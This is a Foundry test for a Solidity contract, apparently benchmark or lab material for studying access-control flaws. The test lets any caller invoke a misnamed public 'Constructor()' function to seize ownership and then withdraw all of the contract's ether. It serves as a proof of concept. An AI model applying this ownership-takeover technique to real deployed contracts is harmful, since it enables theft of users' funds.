
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_3} from "../src/Missing_3.sol";

contract TestAccessControlMissing_3 is Test {
    Missing_3 public _contractUnderTest;
    address public originalDeployer;

    function setUp() public {
        originalDeployer = address(this);
        _contractUnderTest = new Missing_3();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);

        // Note: We do NOT exclude the original deployer because the vulnerability is that
        // the Constructor() function is a regular public function, not a real constructor.
        // Anyone can call it to become the owner, including the original deployer calling it again.

        // --- 2. State Configuration ---
        // Fund the contract so we can verify the caller can withdraw after becoming owner
        vm.deal(address(_contractUnderTest), 10 ether);
        
        // Fund the caller for any gas costs
        vm.deal(caller, 1 ether);

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // TRIGGER VULNERABILITY: Call the misnamed Constructor() function
        // This is a public function that anyone can call to become the owner
        // The vulnerability is that Constructor() should have been constructor()
        _contractUnderTest.Constructor();

        // ASSERT SUCCESS: Verify the caller is now the owner by attempting to withdraw
        // If the caller successfully became the owner, they can now withdraw funds
        uint256 contractBalanceBefore = address(_contractUnderTest).balance;
        uint256 callerBalanceBefore = caller.balance;
        
        vm.prank(caller);
        _contractUnderTest.withdraw();
        
        // Verify the withdrawal was successful (proving caller is now the owner)
        assertEq(address(_contractUnderTest).balance, 0, "Contract balance should be 0 after withdrawal");
        assertEq(caller.balance, callerBalanceBefore + contractBalanceBefore, "Caller should have received the funds");
    }
}
